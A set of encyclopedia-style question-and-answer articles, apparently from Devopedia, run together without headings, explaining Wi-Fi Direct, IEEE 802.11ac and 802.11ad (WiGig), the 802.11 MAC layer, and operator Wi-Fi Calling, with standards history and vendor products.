The intersection of wireless connectivity and streamed audio / video content can be termed as Miracast .
This solution enables seamless mirroring of entire displays across devices or sharing of any type of content that a source could display using Wi - Fi Direct .
Why is the design of Wi - Fi Direct based on infrastructure mode and not ad hoc mode ?
Most commercial devices are for infrastructure mode and not ad hoc mode .
For easier migration and interworking with legacy devices , Wi - Fi Direct is based on infrastructure mode .
Wi - Fi Direct works on principles similar to that of Wi - Fi AP .
Hence , the P2P GO is sometimes also called Soft AP .
.
Is it sufficient for only one device to be Wi - Fi Direct - certified to form a group ?
Yes .
Only the P2P GO needs to be Wi - Fi Direct - certified .
Other group members may be legacy Wi - Fi stations that operate in infrastructure mode .
Wi - Fi Direct essentially embeds a software access point for the group owner .
The software AP provides a version of Wi - Fi Protected Setup with its push - button or PIN - based setup .
Thus , group members see only an AP .
What are the pros and cons of Wi - Fi Direct ?
Wi - Fi Direct can connect multiple devices without a Wi - Fi AP .
Wi - Fi Direct is portable .
No Internet connection is required to transfer files between two devices .
Only one device needs to be Wi - Fi Direct - certified and it can assume the role of the group owner .
Wi - Fi Direct has some limitations .
Not all vendors support it .
Connection has to be re - established with other devices every time to form a group .
As soon as GO leaves the group , all connections are broken and service stops .
The group is formed as a star topology with the GO at the center .
Group members can not talk to each other directly .
Protected by WPA2 , Wi - Fi Direct is secure , but applications could use it wrongly and thereby compromise overall security .
Devices connect using Wi - Fi Protected Setup ( WPS ) but implementations that use the WPS PIN method of setup are insecure .
An analysis from April 2020 of some popular Android applications that use Wi - Fi Direct found 17 security issues .
These applications ( SHAREit , Xender , Xiaomi Mi Drop , Files by Google , Zapya and SuperBeam ) often compromise security in favour of usability .
Wi - Fi Alliance launches Wi - Fi Direct certification program .
Within the same month , Atheros , Broadcom , Intel , Ralink and Realtek announced their first certified products .
A month later , Popular Science magazine recognizes Wi - Fi Direct as one of the best tech innovations of the year .
Google announces Wi - Fi Direct support in Android 4.0 .
Sony , LG , Philips and X.VISION implement Wi - Fi Direct on some of their televisions .
Wi - Fi Direct on an SDN - controlled network .
Source : Poularakis et al .
2017 , fig .
5 .
With the growing adoption of Software Defined Networking ( SDN ) , Poularakis et al .
explore how SDN can be applied to wireless mobile networks .
Traditional SDNs are centralized on the network whereas mobile networks require a distributed architecture .
They propose hybrid architecture .
For one example , they should how Wi - Fi Direct can also be part of the network .
A Wi - Fi Direct smartphone also becomes a virtual switch due to Open vSwitch and uses OpenFlow protocol .
IEEE 802.11ac is a Wi - Fi standard for Very High Throughput ( VHT ) applications .
It 's a significant improvement over the earlier IEEE 802.11n while remaining backward compatible .
It 's designed only for the 5 GHz band .
It provides higher data rates , reaching a maximum of 6.9 Gbps .
Explicit beamforming and MU - MIMO are two important features of 802.11ac that improve network capacity and efficiency .
It has a migration path towards IEEE 802.11ax .
What are the typical use cases for 802.11ac ?
Video introduction to IEEE 802.11ac .
Source : Cisco 2018 .
Video consumption is on the rise .
A 720p uncompressed video at 60 frames / sec needs 1.3 Gbps .
A H.264 lightly compressed video needs 70 - 200 Mbps .
IEEE 802.11n offers a theoretical 600 Mbps but practical rates available for application are a lot less .
The number of devices in the home or office is also increasing .
There 's a need for multiple devices to connect to the same access point and utilize the channels more efficiently .
This is particularly true for bring - your - own - device ( BYOD ) scenarios where each employee may bring multiple Wi - Fi devices to the office .
In general , 802.11ac aims to provide high data rates for video streaming , low latency experience and more efficient multiplexing of multiple clients .
What are the main features of 802.11ac contributing to the higher data rate ?
802.11ac betters 802.11n in three dimensions .
Source : Cisco 2018a , fig .
1 .
While 802.11n offers a maximum data rate of 600 Mbps , 802.11ac can offer 10x data rate due to many improvements : Channel Bonding : Each channel is 20 MHz wide , but with 802.11ac we can combine 8 of these to obtain a 160 MHz channel for a single client .
If available , contiguous channels are easily combined , although the standard defines 80 + 80 MHz mode to combine non - contiguous channels .
Higher Modulation : The use of 256QAM is possible , 4x denser than 64QAM of 802.11n .
This means that 4x more bits can be carried per symbol .
Spatial Streams : Up to 8 spatial streams are possible , although Wave 2 certification covers only 4 spatial streams .
The maximum data rate of 6.9 Gbps is obtained when using 160 MHz channels , 256 QAM , eight spatial streams and 400 ns guard interval .
A handy reference comparing 802.11n and 802.11ac rates relative to SNR and RSSI is available online .
How is 802.11ac able to achieve better efficiency ?
For better channel utilization and network efficiency , the following are useful : 5 GHz Band : The use of 2.4 GHz band is avoided where interference is higher due to cordless phones , microwaves and other devices .
The 5 GHz band is cleaner .
Enhanced RTS / CTS : To avoid collisions due to the use of wider channels , the RTS / CTS mechanism is extended .
A - MPDU : For higher MAC layer throughput , all MAC frames are sent as an Aggregate MAC Protocol Data Unit ( A - MPDU ) , which was introduced in 802.11n for selective use .
MU - MIMO : With Single - User Multiple - Input and Multiple - Output ( SU - MIMO ) , only one client can send / receive at a particular time .
Multi - User Multiple - Input and Multiple - Output ( MU - MIMO ) is able to multiplex multiple clients at the same time , thus reducing latency and improving overall network efficiency .
Beamforming : Due to the use of MIMO and multiple antennas , beamforming is possible .
Transmission is steered towards each client .
This is made more efficient via explicit feedback from clients – using Null Data Packet ( NDP)–for better channel estimation .
What are some trade - offs involved in using 802.11ac ?
The Decisions to trade - off one metric with another will depend on real - time network conditions .
Moving from 40 MHz to 80 MHz aggregate bandwidth will increase the data rate , but since the same power is spread across many more subcarriers , range will reduce .
Obtaining a free channel 160 MHz wide is also difficult , especially in enterprise use cases .
It 's easier with 80 + 80 MHz mode but this requires twice as many RF chains .
Moving from 64QAM to 256QAM is possible only over short distances ( good signal - to - noise ratio ) since the constellation is tighter and more sensitive to errors .
Beamforming using Explicit Compressed Feedback ( ECFB ) gives a precise channel estimate , but this feedback comes with a lot of overhead .
Beamforming and MU - MIMO become less effective when clients are moving .
In terms of spatial streams , each stream requires its own antenna and RF chain .
Although 8 streams are defined in the standards , often this is impractical on mobile devices since each antenna must be sufficiently spaced .
Could you explain the 802.11ac MU - MIMO ?
Benefits of 802.11ac MU - MIMO .
Source : Adapted from Qualcomm Atheros 2015 , fig .
3 , 4 .
Since 802.11n , SU - MIMO allows routers to send / receive multiple streams of data to / from clients .
MU - MIMO is introduced on 802.11ac in the downlink .
An access point can send data to multiple clients at the same time .
For example , with three clients A , B and C , two streams may be sent to A , one stream to B and one stream to C simultaneously .
Clients receiving single streams need not have multiple antennas or RF chains , which is often the case with small devices and smartphones .
With MU - MIMO , we get better network capacity utilization because a single client with not much to send can be multiplexed with other clients .
Because multiple clients can be allowed to receive at the same time , latency also drops .
Even non - MIMO clients will benefit since they can access the channel more easily .
More device clients can be supported on the Wi - Fi network .
On 802.11ac , MU - MIMO is available only on the downlink .
Another limitation is that access points might fallback to SU - MIMO if they detect that clients are moving , since MU - MIMO may not work well .
What are 802.11ac Wave 1 and Wave 2 ?
Comparison of 802.11n , 802.11ac Wave 1 and 2 .
Source : Cisco 2018b , table 1 .
The idea of identifying two " waves " of 802.11ac products was to allow vendors to release their first 802.11ac products into the market quickly .
Wave 2 is complex due to MU - MIMO , 160 MHz bandwidth support and four spatial streams .
By defining Wave 1 without these features , we can still benefit from having 256QAM and 80 MHz bandwidth support that 802.11n lacked .
First Wave 1 products started arriving in 2013 .
Certification for these also started in mid-2013 .
From 2014 , all new products started supporting Wave 1 .
Early Wave 2 products arrived in 2015 .
Certification for Wave 2 started in mid-2016 .
Work on 802.11ac standardization formally commences with the approval of the Project Allocation Request .
Draft 2.0 of 802.11ac be released in January .
A refined draft 3.0 will be released in May. Wi - Fi Alliance announces the certification process for 802.11ac Wave 1 products .
The IEEE 802.11ac-2013 standard has been published .
Along with IEEE 802.11ad-2012 that was standardized a year earlier , both are the result of the Very High Throughput ( VHT ) study group .
Quantenna becomes the first to have a chipset that 's capable of 4x4 MU - MIMO but without 160 MHz support .
In April , Qualcomm Atheros also started offering chipsets for MU - MIMO .
In general , 802.11ac Wave 2 support arrives in 2014 whereas 2013 saw only 802.11ac Wave 1 support .
Major chipset vendors at CES 2015 .
Source : Lestable 2016 , slide 78 .
At CES 2015 , more chipsets and products capable of 802.11ac Wave 2 were announced .
What 's probably the world 's first 802.11ac router with MU - MIMO support , Linksys releases its EA8500 .
For best results , clients also need to support MU - MIMO .
Some existing devices might support it with a firmware upgrade since their underlying chipsets have MU - MIMO support already .
An example of this is the ASUS RT - AC87U router released in August 2014 .
Wi - Fi Alliance announces the certification process for 802.11ac Wave 2 products .
CNET identifies some of the best 802.11ac routers .
This includes brands Asus , Synology , D - Link and Netgear .
Asus has multiple routers , highly recommended by CNET .
In scenarios where we desire throughput in excess of 1 Gbps and low latency , such as in home or office environments , we still use wires .
At least , there was n't a suitable Wi - Fi protocol to cater to these scenarios until the IEEE 802.11ad was conceived .
The IEEE 802.11ad is a protocol for very high data rates ( about 8 Gbps ) for short range communication ( about 1 - 10 meters ) at the 60 GHz unlicensed band .
Because of its 60 GHz operation band , 802.11ad complements but does not interoperate at the PHY layer with 802.11ac at 5 GHz band .
This standard is also called Directional Multi - Gigabit ( DMG ) .
Commercially , the term WiGig ( Wireless Gigabit ) is common .
Vendor support for IEEE 802.11ad has been growing since 2016 .
This standard has an evolution path towards IEEE 802.11ay , which also operates in the 60 GHz band .
What are the typical use cases for 802.11ad ?
Smartphone use cases of 802.11ad .
Source : Qualcomm 2017 .
We are surrounded by gadgets at home , at the office and even in our daily commutes .
The content is also media rich and there 's a need to stream HD videos or play interactive games .
Wires are one option , but going wireless would be a lot more convenient .
Think about connecting your laptop to a projector ; or connecting a Blu - ray player to an HDTV ; or sharing content from one phone to another ; or playing a virtual reality game with wireless controls .
The IEEE 802.11ad enables us to get rid of wires in homes and offices .
It can be used for wireless docking , display , entertainment , instant file transfers , HD media streaming , AR / VR apps , and more .
In general , applications that require high bandwidth ( > 1 Gbps ) and low latency ( ~ 10 US ) can benefit from 802.11ad .
With the 802.11ad , it has become possible to connect without wires to consumer electronics devices , handheld devices and personal computers .
This standard is ideal for short - range line - of - sight ( LOS ) connections , although non - LOS is possible due to multiple antennas .
It could also see usage in public Wi - Fi infrastructure and small cell backhaul .
What frequency bands are used by 802.11ad ?
Available 802.11ad channels in the 60 GHz band .
Source : Schulz 2017 , fig .
3 - 1 .
Previously , in the 802.11 - 2016 standard , 802.11ad had four channels in the range 57 - 66 GHz .
Today , the IEEE 802.11ad operates in the 57 - 70 GHz frequency range .
Six channels are available with each having a nominal channel bandwidth of 2.16 GHz .
Channel 2 ( 59.40 - 61.56 GHz ) is available in all regions and is considered as the default channel .
The channel bandwidth of 2.16 GHz is a lot of spectrum , thus allowing 802.11ad to offer multi - gigabit speeds .
Comparatively , the most that 802.11ac Wave2 can offer is 160 MHz via channel bonding .
What are the technical details or parameters of the 802.11ad ?
Overview of 802.11ad PHY .
Source : Schulz 2017 , fig .
3 - 19 .
At the PHY layer , the 802.11ad has three modes : Control , Single Carrier ( SC ) , and OFDM .
Later , OFDM mode was made obsolete .
There 's also the optional Low - power Single Carrier mode for mobile devices .
The 802.11ad does not support spatial multiplexing such as MIMO .
It supports a single spatial stream on a single channel .
However , it supports beamforming for spatial separation and directional operation .
Up to 32 antennas are possible .
2 Gbps at 100 feet LOS is possible .
A variety of modulation and coding schemes ( MCS ) are available .
MCS0 is for Control .
MCS1 - 12 with extensions are for SC mode .
MCS25 - 31 are for Low - power SC mode .
MCS13 - 24 are for OFDM mode .
Data rates vary from 385 Mbps to 8085 Mbps .
The maximum rate is achieved in MCS12.6 using & pi;/2 - 64QAM and Low Density Parity Code ( LDPC ) at a rate of 7/8 .
The maximum rate for low - power SC is at MCS31 giving 2503 Mbps .
Compared to 802.11ac , the 802.11ad is more power efficient .
It has five times lower power consumption per bit .
The MAC frame consists of preamble , header , data , and optional training for beamforming .
Golay Sequences are extensively used in the preamble .
Could you explain Fast Session Transfer ?
Fast Session Transfer can be transparent or non - transparent .
Source : Gigabit Wireless 2018 .
Fast Session Transfer ( FST ) is a MAC layer feature of the 802.11ad that allows for multiband operation .
While the 802.11ad is incompatible with older standards at the PHY layer due to operation at 60 GHz , interoperability is possible at the MAC layer .
FST is managed by a Common Upper MAC sublayer that sits on top of a Lower MAC sublayer containing band - specific implementation .
With FST , we can have seamless transfer of sessions from 60 GHz band to other bands , and vice versa .
For example , if a better range is desired , then the session may be transferred from 60 GHz to 5 GHz while sacrificing throughput .
A session transfer that involves a different MAC address may be slower than when the same MAC client and address is used for all bands .
Some devices may be capable of supporting multiple bands at the same time .
TP - Link 's AD7200 offers such a multiband operation .
A related concept is called band steering , where an access point presents a single SSID for clients across all bands .
This is supported by some D - Link routers but not by TP - Link 's AD7200 .
Who is currently supplying 802.11ad chipsets ?
Chipsets are available from Broadcom , Intel , Qualcomm Atheros , Wilocity , Tensorcom , Peraso , Lattice Semiconductor , MediaTek , Nitero , and others .
Wikipedia gives a list of specific chips from these vendors .
At CES 2013 , Wilocity was one of the first to give a prototype demo of the technology based on its chips .
The Wilocity chip was also used in the Dell Latitude 6430u Ultrabook .
In July 2014 , Wilocity was acquired by Qualcomm .
Qualcomm stated that their future chips will be tri - band : 2.4 GHz , 5 GHz and 60 GHz .
Commercially , what 802.11ad products are currently available ?
Wireless routers and access points are available from Netgear , Acelink , TP - Link , IgniteNet and Asus .
In January 2016 , Acer released the TravelMate P648 notebook with 802.11ad support .
Asus announced an 802.11ad smartphone back in September 2017 .
TP - Link 's Talon AD7200 claims a theoretical speed of 7200 Mbps via multiband operation but a speed test over a distance of couple of meters gave 868 Mbps downlink and 280 Mbps uplink .
What are the alternatives to 802.11ad ?
The IEEE 802.11ad is not the only protocol for multi - gigabit wireless .
There 's SiBeam 's WirelessHD ( aka UltraGig ) , which also operates in the 60 GHz band .
Back in 2010 , when the 802.11ad was being published , SiBeam was already shipping its chips for integration into consumer products .
WirelessHD is designed for video , as high as 28 Gbps .
This means that uncompressed 1080p FullHD video can be transmitted .
WirelessHD specs were released in January 2008 .
However , WirelessHD websites show no news after 2013 .
There 's also Wireless Home Digital Interface ( WHDI ) , which operates in the 5 GHz band .
Its purpose is to deliver interactive HD video from any device to any display , with a quality equivalent to a wired HDMI cable .
Let 's not forget Miracast , which runs over 802.11n or 802.11ac in the 5 GHz band .
With Miracast , for example , we can stream content from a smartphone to a TV .
How is the 802.11ad related to Media Agnostic USB ?
In September 2013 , Wi - Fi Alliance transferred its work on " WiGig Serial Extension Specification " to USB - IF ( USB Implementers Forum ) .
USB - IF will use this as a starting point for standardising Media Agnostic USB ( MA - USB ) .
An alternative standard called Wireless USB operates in the range 3.1 - 10.6 GHz .
MA - USB is agnostic of the underlying technology .
Data can be transferred on Wi - Fi 2.4/5 GHz or WiGig 60 GHz .
At IEEE , the VHT Study Group started looking into Very High Throughput ( VHT ) at 60 GHz .
Both 802.11ac and 802.11ad come under the scope of VHT .
About 15 technology companies come together to form the Wireless Gigabit ( WiGig ) Alliance , an organization tasked with defining a wireless specification at the 60 GHz band .
Version 1.0 of the WiGig specification has been released .
It supports data rates up to 7 Gbps .
WiGig 1.0 announced Wi - Fi Alliance and WiGig Alliance entered into a partnership .
This enables Wi - Fi products in the 60 GHz band .
The Wi - Fi Alliance is committed to studying the WiGig specs and perhaps certifying them for them .
As an amendment to the overall IEEE 802.11 , IEEE 802.11ad-2012 is published with the title " Enhancements for Very High Throughput in the 60 GHz Band " .
It includes changes to both the PHY and MAC layers .
This was subsequently amended in March 2014 .
After two years of collaboration , the Wi - Fi Alliance and the Wireless Gigabit Alliance merged .
Further work on WiGig , including product certification , will be taken up by Wi - Fi Alliance .
TP - Link 's Talon AD7200 is probably the world 's first WiGig router .
Source : Anthony 2016 .
At CES 2016 , TP - Link demos its WiGig router , Talon AD7200 .
At 60 GHz , it claims a 4.6 Gbps raw data rate .
It also supports a / b / g / n / ac standards where 802.11ad is not available .
It has eight antennas for beamforming .
Inside , it uses two Qualcomm Atheros chips , one for older standards and another for 802.11ad .
Also at CES 2016 , Acer shows off its TravelMate P648 with 802.11ad support .
The OFDM mode has interoperability issues with Single Carrier ( SC ) mode .
As a result , the OFDM mode has been made obsolete .
In the future , 802.11ay may design a proper OFDM PHY at 60 GHz .
This change goes into the IEEE 802.11 - 2016 standard , released in December 2016 .
Asus ZenFone 4 Pro becomes the world 's first smartphone to support WiGig .
It 's not clear if the device is certified by the Wi - Fi Alliance .
It uses the Snapdragon 835 Mobile Platform .
The IEEE 802.11 MAC sub - layer is responsible for coordinating access to the shared physical air interface so that the Access Point ( AP ) and Wi - Fi stations in range can communicate effectively .
MAC takes data from a higher sub - layer called LLC , adds header and tail bytes , and sends them to the lower physical layer for transmission .
The reverse happens when receiving data from the physical layer .
If a frame is received in error , the MAC can retransmit it .
Multiple access is based on carrier sensing , channel contention and random backoff .
Due to contention , a Wi - Fi network with a large number of active stations can suffer from low throughput and high latency .
IEEE 802.11e and its subset Wi - Fi Multimedia attempt to alleviate this problem .
What 's the purpose of the MAC layer in 802.11 ?
MAC deals with MSDUs and MPDUs .
Source : Vergès 2015 .
MAC stands for " Medium Access Control " , which implies that it 's main function is to control access to a shared medium .
The air interface is a shared medium through which all multiple Wi - Fi stations and access points ( AP ) attempt to transfer data .
MAC implements the control mechanisms that allow multiple devices to reliably communicate by sharing the medium as specified in the standard .
Formally , MAC functions include scanning , authentication , association , power saving and fragmentation .
When it comes to the actual handling of data , the MAC sits as a sub - layer within the Data Link Layer .
It takes a packet of data called MAC Service Data Unit ( MSDU ) from the Logical Link Control ( LLC ) sub - layer .
MAC adds the necessary header and tail bytes to form the MAC Protocol Data Unit ( MPDU ) .
MPDU is then sent to the physical layer for transmission .
The reverse flow happens when the MAC receives a packet from the physical layer .
How does a Wi - Fi station discover and associate with an AP ?
There are two modes of discovery and the station is at liberty to use either or both : Passive scanning : The station looks for beacon frames that are regularly sent by the AP .
These frames contain essential information about the network .
If there are multiple APs within range , it selects the strongest one .
The station then attempts to connect to the AP .
Communication happens on the channel on which the AP is operating .
Active scanning : The station sends a probe request either to a specific AP or to any AP within range .
Either way , it expects a probe response from one or more APs , selects the strongest and attempts to connect to that AP .
Since no prior beacon has decoded , the station will send its probe on all channels .
What multiple access scheme is used in 802.11 ?
MAC uses what 's called Point Coordination Function ( PCF ) or Distributed Coordination Function ( DCF ) .
The latter is more prevalent in the industry and employs Carrier Sense Multiple Access with Collision Avoidance ( CSMA / CA ) .
There are two parts to CSMA / CA as suggested by the name : Carrier Sensing : Wi - Fi stations must first sense the air interface .
Only if the channel is idle for a specified amount of time ( of duration DIFS ) , will they transmit .
DIFS stands for DCF InterFrame Spacing .
Collision Avoidance : If the channel is sensed busy , the station waits till it 's free for DIFS duration , then waits for a random interval before transmitting .
This randomness reduces the chances that two waiting stations end up transmitting at the same time .
" Collisions " can still occur and they are inferred when no acknowledgement is received by the sender .
If an ACK is not received , the station backs off for a random duration and repeats the process again .
What 's the structure of 802.11 MAC frames ?
MAC data and ACK frames , along with details of the Frame Control Field .
Source : Adapted from National Instruments 2017 , figs .
6 - 8 .
There are three types of MAC frames : data , control and management .
Only data frames contain higher layer data .
Control frames include ACK , RTS , CTS , Power Save Poll , etc .
Management frames help stations discover and connect to AP .
All frames start with a 2-byte Frame Control that specifies the frame type and further details .
All frames end with a 4-byte Frame Check Sequence ( FCS ) that 's used to detect errors .
Frame Control is part of what 's called the MAC header , which can vary in length .
For data frames , MAC header and FCS are added by MAC layer around the MSDU received from LLC .
MSDU is often called MAC payload or frame body .
Further details on MAC frame are available online .
Are there techniques in MAC to improve the reliability of communication ?
When ( B ) hears the CTS meant for ( A ) it defers its own transmission .
Source : Campbell 2018 , slide 11 .
MAC uses many techniques and here we describe the important ones : Error Detection : Every MAC frame contains 4-byte FCS that 's used to detect errors .
Retransmission : For a corrupted frame , the receiver will not send an acknowledgment frame .
The sender will therefore retransmit the frame .
Fragmentation & Reassembly : When frames are larger , there 's a higher chance of collision .
MAC can therefore fragment data / management frames and transmit them as individual MAC frames .
Any errors , only fragments need to be retransmitted .
RTS / CTS : Request - to - Send and Clear - to - Send are used to solve the hidden - node problem .
When stations are widely spread around an AP , some may be hidden from others on the wireless channel .
RTS / CTS handshaking alleviates this problem and reduces collisions .
This is an optional feature .
What are the MAC enhancements due to High Throughput ( HT ) ?
Showing 802.11n frame aggregations A - MSDU and A - MPDU .
Source : Hoffmann 2010 , slide 19 .
IEEE 802.11n introduced changes to MAC that are part of High Throughput ( HT ) .
The idea was to reduce MAC overhead and increase overall throughput .
This is done using Frame Aggregation .
Two types are possible : Aggregate MAC Service Data Unit ( A - MSDU ) : Multiple MSDUs are packed into a single MPDU that in turn maps to a single transmission frame .
In this case , all MSDUs share the same MAC header .
Aggregate MAC Protocol Data Unit ( A - MPDU ) : Multiple MPDUs are carried within a single transmission frame .
Obviously , each MPDU has its own MAC header .
These two are not mutually exclusive : a single transmission can have a combination of A - MSDUs and A - MPDUs , sometimes called two level frame aggregation .
In fact , research has shown that a combination of the two gives the best performance on both 802.11n and 802.11ac devices .
The MAC frame is extended : a new header field called HT Control plus a larger payload size .
Block Acknowledgments ( BACK ) are introduced .
What are the MAC enhancements due to Very High Throughput ( VHT ) ?
IEEE 802.11ac introduced changes to MAC that are part of Very High Throughput ( VHT ) .
VHT also impacts deployments on the 60 GHz band such as for 802.11ad .
Frame aggregation can happen like on 802.11n but in larger sizes : MPDU size of about 8 KB ( 11n ) vs 11 KB ( 11ac ) ; PSDU size of about 64 KB ( 11n ) vs 4 MB ( 11ac ) .
The MAC frame is updated : HT Control is defined for 11ac plus larger payload size .
All frames are sent as A - MPDUs even if they contain only one MPDU .
I 've heard the terms " lower MAC " and " upper MAC " .
What are these ?
The part of the MAC that interacts with the LLC sub - layer is sometimes called upper MAC , while the part that interacts with the PHY layer is called lower MAC .
Thus , MSDUs and A - MSDUs are processed in the upper MAC while MPDUs and A - MPDUs are processed in the lower MAC .
In general , lower MAC deals with more time - critical operations such as MPDU transmissions and acknowledgements .
For example , association of stations with AP is done by the upper MAC but actual medium access ( time - critical ) is handled by the lower MAC .
It 's common for lower MAC to be implemented in hardware such as in FPGA .
IEEE 802.11e introduces QoS enhancements to the MAC .
The Hybrid Coordination Function ( HCF ) has been introduced .
The MAC header includes a 2-byte QoS Control field .
IEEE 802.11n has been released and it includes changes to the MAC .
IEEE 802.11ac has been released and it includes changes to the MAC .
Common logos for Wi - Fi Calling ( via Google image search ) .
Source : Devopedia .
Wi - Fi Calling is a technology that allows users to make or receive voice calls via a local Wi - Fi hotspot rather than via their mobile network operator 's cellular radio connection .
Voice calls are thus carried over the Internet , implying that Wi - Fi calling relies on VoIP .
However , unlike other VoIP services such as Skype or Viber , Wi - Fi Calling gives operators more control .
Wi - Fi calling is possible only if the operator supports it , the user 's phone has the feature and the user has enabled it .
Once enabled , whether a voice call uses the cellular radio link or Wi - Fi link is almost transparent to the user .
With cellular networks going all IP and offering VoLTE , Wi - Fi Calling has become practical and necessary in a competitive market .
Wi - Fi Calling is also called Voice over Wi - Fi ( VoWi - Fi ) .
In what scenarios can Wi - Fi calling be useful to have ?
In places where cellular coverage is poor , such as in rural residences , concrete indoors , basements , or underground train stations , users will not be able to make or receive voice calls .
In these scenarios , the presence of a local Wi - Fi network can serve as the " last - mile " connectivity for the user .
Wi - Fi can therefore complement the cellular network in places where the latter 's coverage is poor .
For example , a user could be having an active voice call via the cellular network and suddenly enter a building with poor coverage .
Without Wi - Fi calling , the call might get dropped .
With Wi - Fi Calling , the call can be seamlessly handed over to the Wi - Fi network without even the user noticing it .
Astute users may notice that their call is on Wi - Fi , since smartphones may indicate this via an icon .
More importantly , user intervention is not required to switch between cellular and Wi - Fi .
Such seamless handover has become possible because of cellular networks ' IP and packet switching : VoWi - Fi can be handed off to VoLTE , and vice versa .
Is n't Wi - Fi calling the same as Skype , Viber or WhatsApp voice calls ?
Many smartphone apps allow voice ( and even video ) calls over the Internet .
They are based on VoIP technology .
We normally call them over - the - top ( OTT ) services since they merely use the phone 's data connection and operators bill for data usage and not for the service itself .
However , many of these systems require both parties to have the same app installed .
Even when this constraint is removed , the service is controlled by the app provider .
Wi - Fi Calling gives cellular operators greater control .
Driven by competition from OTT services , Wi - Fi Calling gives operators an opportunity to regain market share for voice calls .
Voice packets are carried securely over IP to the operator 's core network , thus allowing the operator to reuse many resources and procedures already in place for VoIP calls .
Likewise , messages and video – Video over LTE ( ViLTE)–can also be carried over Wi - Fi .
From an architectural perspective , Wi - Fi Calling is served by the operator 's IP Multimedia Subsystem ( IMS ) , whereas Skype calls are routed out of the operator 's network into the Internet .
Is n't Wi - Fi Calling the same as Wi - Fi Offload ?
Not exactly .
Wi - Fi calling can be seen as a form of offload , but they have different motivations .
Wi - Fi Offload came about to ease network congestion and improve QoS for users in high - density areas .
The offload is transparent for users whose devices are authenticated via EAP - SIM / AKA .
Wi - Fi Calling is in response to OTT services stealing revenue from mobile operators .
Even when VoLTE was deployed by operators , voice calls could n't be made over Wi - Fi and OTT services were what users used when they had access to Wi - Fi .
Wi - Fi Calling aims to overcome this problem .
What are the possible benefits of Wi - Fi calling ?
For subscribers , benefits include seamless connectivity and mobility between cellular and Wi - Fi .
The selection is automatic and transparent for users .
Data is protected using IPSec from mobile to core network , along with traditional SIM - based authentication .
Users can potentially lower their monthly bills through service bundles and reduced roaming charges .
Sometimes , calling home from another country could be free depending on the subscribed plan and operator .
Moreover , the user 's phone will have a single call log ( likewise , for message log ) .
The default dialler can be used along with all saved contacts .
Those receiving the call will see the caller 's usual phone number .
This is not possible with a third - party installed app .
For operators , Wi - Fi complements cellular coverage and capacity .
T - Mobile was one of the early adopters because it had poor indoor coverage .
Wi - Fi Network performance is optimized by allowing bandwidth - intensive traffic to be offloaded to Wi - Fi when so required .
All their IMS - based services can now be extended to Wi - Fi access rather than losing out to OTT app / service providers .
How does the network architecture change for Wi - Fi Calling ?
Network architecture for Wi - Fi Calling .
Source : Terve 2015 , slide 22 .
Two network functions are involved : Evolved Packet Data Gateway ( ePDG ) : Serves an untrusted Wi - Fi network .
An IPSec tunnel protects data between mobile and ePDG , from where it goes to Packet Gateway ( PGW ) .
The mobile phone needs an update with an IPsec client .
No changes are needed to the access point .
Trusted Wireless Access Gateway ( TWAG ) : Serves a trusted Wi - Fi network , which is typically under the operator 's control .
In this case , data between mobile and TWAG is encrypted at radio access and IPSec is not used .
From TWAG , data goes to PGW .
No changes are needed for the mobile but Wi - Fi access point needs to be updated .
If the network is not an Evolved Packet Core ( EPC ) , then Tunnel Termination Gateway ( TTG ) is used instead of ePDG ; Wireless Access Gateway ( WAG ) is used instead of TWAG ; GGSN is used instead of PGW .
The untrusted mode is often used for Wi - Fi calling , since public hotspots can be used without updating the access point .
It 's the operator who decides if a non-3GPP access can be considered trusted .
How is an end - user device authenticated for Voice over Wi - Fi service ?
3GPP AAA Server and its interfaces .
Source : Atos 2018 .
Within the network , 3GPP AAA Server is used to authenticate end devices .
Authentication is based on SIM and the usual network functions located in the Home Subscriber Server ( HSS ) .
3GPP AAA Server does not maintain a separate database and relies on HSS .
Vendors who sell AAA servers usually offer the ability to do authentication of devices that do n't have SIM .
For legacy networks , they can interface with HLR rather than HSS .
They support AAA protocols such as RADIUS and Diameter .
They support various EAP methods including TLS , PEAP and CHAP .
What are the 3GPP standards covering Wi - Fi calling ?
Documents that specify " non-3GPP access " are applicable to Wi - Fi calling .
The following are some relevant documents ( non - exhaustive list ) : TR 22.814 : Location services TR 22.912 : Study of network selection requirements TS 23.402 : Architectural enhancements TS 24.234 : 3GPP - WLAN interworking : WLAN UE to network protocols , Stage 3 TS 24.302 : Access to EPC , Stage 3 TS 29.273 : 3GPP EPS AAA interfaces TS 33.402 : System Architecture Evolution : security aspects TR 33.822 : Security aspects for inter - access mobility In addition , GSMA has released a list of Permanent Reference Documents on VoWi - Fi .
Wi - Fi Calling is a technology that comes from the cellular world .
From a Wi - Fi perspective , there 's no special IEEE standard that talks about Wi - Fi Calling .
Are there commercial services offering Wi - Fi calling ?
In June 2016 , it was reported that all four major operators in the US support Wi - Fi calling , with T - Mobile supporting as many as 38 different handsets .
In November 2016 , there were 40 + operators offering Wi - Fi calling in 25 + countries .
Moreover , even affordable phones or devices without SIMs support Wi - Fi calling .
An operator will normally publish a list of handsets that are supported , which usually includes both Android and iPhone models .
In September 2017 , it was reported that AT&T has 23 phones and Verizon has 17 phones that support Wi - Fi calling .
Wi - Fi Calling may involve regulatory approval based on the country 's licensing framework .
For example , India 's TRAI commented in October 2017 that Wi - Fi Calling could be introduced since licensing allows telephony service to be provided independent of radio access .
Within enterprises , how can IT teams plan for Wi - Fi calling ?
Some access points have the ability to prioritize voice traffic and this can be repurposed for Wi - Fi calling .
Examples include Aerohive , Aruba , Cisco Aironet and Ruckus .
Enterprises can also work with operators to deploy femto / pico cells or distributed antenna systems .
A minimum of 1 Mbps may be needed to support Wi - Fi calling , although Republic Wireless in the US claims 80 kbps is enough to hold a call , although voice quality may suffer .
In reality , the voice needs just 12 kbps but can scale down to 4.75 kbps .
How will users be billed for Wi - Fi calling ?
This is completely operator dependent and based on the subscriber 's current plan .
For example , Canada 's Rogers says that calls and messages are deducted from airtime and messaging limits .
Roaming charges may apply only to international roaming .
Verizon Wireless states that a voice call will use about 1 MB / minute of data ; a video call will use 6 - 8 MB / minute .
Billing is linked to the user 's current plan .
What are some practical issues with Wi - Fi calling ?
Back in 2014 , T - Mobile had handoff problems but it was improved later .
The service was also not offered by other operators and not supported by most handsets .
Even when a handset supports it , operators may not offer the service if the handset has not been purchased from the operator .
Since any Wi - Fi hotspot can be used , including public ones , security is a concern .
For this reason , all data over Wi - Fi must be protected and subscriber must be authenticated by the cellular operator .
Seamless call continuity across cellular and Wi - Fi could be a problem , particularly when firewalls and VPNs are involved .
Some users have reported problems when using Wi - Fi behind corporate firewalls .
Likewise , IT teams in enterprises may have the additional task of ensuring Wi - Fi coverage and managing traffic .
